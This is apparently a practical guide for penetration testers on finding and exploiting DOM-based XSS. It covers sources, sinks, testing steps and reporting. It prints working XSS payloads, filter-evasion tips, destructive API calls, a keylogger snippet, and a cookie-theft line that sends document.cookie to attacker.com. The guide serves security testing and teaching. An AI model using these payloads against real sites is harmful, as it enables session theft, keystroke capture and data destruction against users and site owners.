# **DOM-Based XSS – Practical Pentesting Guide**

## **1. Objective**

Identify and exploit client-side vulnerabilities where untrusted input is processed in the browser and executed through unsafe DOM manipulation.

## **2. Core Concept**

A DOM-based XSS occurs when:

* **Source**: Untrusted input enters the application
* **Sink**: That input is inserted into the DOM in an unsafe way

If input flows from a source to a sink without proper sanitization or encoding, it can lead to execution of arbitrary JavaScript.

## **3. Common Sources (Untrusted Input)**

* `location.search` (URL parameters)
* `location.hash` (URL fragments)
* `document.referrer`
* `localStorage` / `sessionStorage`
* Form inputs (name, comments, search fields)
* API responses rendered on the frontend

## **4. Common Sinks (Execution Points)**

### Native JavaScript

* `innerHTML`
* `outerHTML`
* `insertAdjacentHTML`
* `document.write`

### Framework-specific

* Vue: `v-html`
* React: `dangerouslySetInnerHTML`
* Angular: `innerHTML` bindings

## **5. Testing Methodology**

### Step 1: Identify Source → Sink Flow

* Use browser DevTools (Elements + Sources tab)
* Trace where input is read and how it is rendered
* Confirm if sanitization is applied

### Step 2: Determine Context

Identify where your input lands:

* **HTML context** → inject tags
* **Attribute context** → escape quotes (`"`, `'`)
* **JavaScript context** → break out of strings/functions
* **URL context** → inject `javascript:` or event handlers

### Step 3: Initial Payload Testing

```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

If blocked, try:

* Encoding (`%3Cimg...`)
* Alternate tags (`svg`, `iframe`)
* Case variations or obfuscation

### Step 4: Handle Dynamic Applications (SPA Issues)

Single Page Applications often re-render the DOM.

Use delayed execution:

```html
<img src=x onerror="setTimeout(()=>{alert(1)},6000)">
```

Or event-based execution:

```html
<img src=x onerror="document.body.addEventListener('click', ()=>alert(1))">
```

### Step 5: Test for Stored DOM XSS

* Inject payload into input field
* Submit and store it
* Revisit the page or trigger rendering
* Check if payload executes again

### Step 6: Analyze Network Behavior

Use:

* Browser Network tab
* Burp Suite

Check:

* Does input affect API requests?
* Can you manipulate request parameters?
* Can actions be triggered via injected JavaScript?

Example:

```javascript
fetch('/api/delete?id=123')
```

Test modification:

```javascript
fetch('/api/delete?id=ALL')
```

### Step 7: Check Security Controls

Look for:

* Content Security Policy (CSP)

If CSP exists:

* Check allowed sources
* Attempt bypass using permitted domains or inline execution (if allowed)

## **6. Exploitation Goals (Beyond alert)**

Focus on real impact:

### Data Exfiltration

```javascript
fetch('https://attacker.com?cookie=' + document.cookie)
```

### Unauthorized Actions

```javascript
fetch('/api/deleteAll', { method: 'POST' })
```

### Keylogging

```javascript
document.onkeypress = e => fetch('/log?key=' + e.key)
```

---

## **7. Workflow Summary**

1. Inspect application using DevTools
2. Identify sources and sinks
3. Trace data flow
4. Test basic payloads
5. Adjust payload based on context
6. Handle dynamic rendering (delay/events)
7. Test for persistence
8. Analyze API interactions
9. Validate real-world impact
10. Document findings

## **8. Reporting Guidelines**

Include:

* Source and sink identification
* Data flow explanation
* Payload used
* Execution context
* Impact (data theft, account takeover, etc.)
* Proof of exploitation (screenshots, logs)

## **9. Key Notes**

* Not all XSS is immediately visible; some require interaction or timing
* Frameworks do not guarantee safety if unsafe rendering methods are used
* Always prioritize impact over proof-of-concept alerts

---
